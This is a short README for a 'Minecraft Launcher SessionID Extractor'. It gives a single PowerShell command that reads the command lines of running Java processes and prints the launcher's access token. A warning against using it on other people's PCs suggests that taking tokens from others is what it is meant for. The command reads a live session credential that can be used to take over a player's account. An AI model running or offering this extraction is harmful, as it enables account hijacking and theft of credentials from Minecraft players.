# Minecraft Launcher SessionID Extractor

Requirements:

Powershell
Active Minecraft Session [Minecraft Launcher]

-

# ONLY USE IN SECURE OR TESTING LABS, USING ON OTHER PEOPLES PC's WITHOUT ACCESS CAN GET YOU LEGAL ACTIONS AND IT IS NOT MY FAULT!

Open Powershell Whilst MC Launcher Is Open [With An Active Session]

Run The Command: `Get-CimInstance Win32_Process -Filter "Name LIKE '%java%'" | Where-Object {$_.CommandLine -match '--accessToken\s+([^\s]+)'} | ForEach-Object {$matches[1]}`
It will show your access token in the terminal.
